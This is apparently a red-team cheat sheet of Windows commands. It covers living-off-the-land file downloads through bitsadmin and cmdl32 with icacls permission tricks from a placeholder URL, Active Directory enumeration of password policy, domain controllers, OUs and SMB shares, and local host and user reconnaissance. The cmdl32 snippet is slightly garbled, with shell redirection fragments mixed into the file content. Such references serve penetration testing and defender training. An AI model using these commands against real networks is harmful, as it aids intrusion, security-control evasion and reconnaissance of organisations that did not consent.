# RedTeam-CheatSheet

## Living off the Land
https://lolbas-project.github.io/#  
### Examples
#### Bitsadmin
`bitsadmin /transfer "import" https://<URL> C:\Users\<user>\output.txt`
#### cmdl32
1. Create a file '_settings.txt_'
```
[Connection Manager]
CMSFile=settings.txt >> settings.txt
ServiceName=WindowsUpdate >> settings.txt
TunnelFile=settings.txt >> settings.txt
[Settings] >> settings.txt
UpdateUrl=<URL of Remote File>
```
2. Run the following commands to download remote file

```
icacls %cd /deny %username%:(OI)(CI)(DE,DC)
set tmp=%cd%
cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
```
3. Remove icacls
`icacls %cd% /remove:d %username%`

## AD Enumeration
### Domain Controllers
```
# Password Policies
Get-ADDefaultDomainPasswordPolicy
Get-ADDomainController -filter * | select Name, IPv4Address
```
### Organizational Units and Device Searches
```
# Organizational Units (OU's)
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishableName -A

# Get Computers within the OU's
Get-ADComputer -SearchBase "<OU-String>" -Filter * | Select-Object -ExpandProperty Name
```
### File Shares 
```
# Store devices in an OU into $FileServAD
$FileServAD = Get-ADComputer -SearchBase "OU=Servers,DC=corp,dc=ad" -Filter * | Select-Object -ExpandProperty Name

# Get SMB Shares on all the devices
Invoke-Command -ComputerName $FileServAD -ScriptBlock {Get-SmbShare -Special $false}
```

## Local
### Host Information
```
# System Info
sysinfo

#Networking
ipconfig /all
hostname
```

### Users and Groups
```
net users
net user <username>
net localgroups
net localgroup Administrators
```
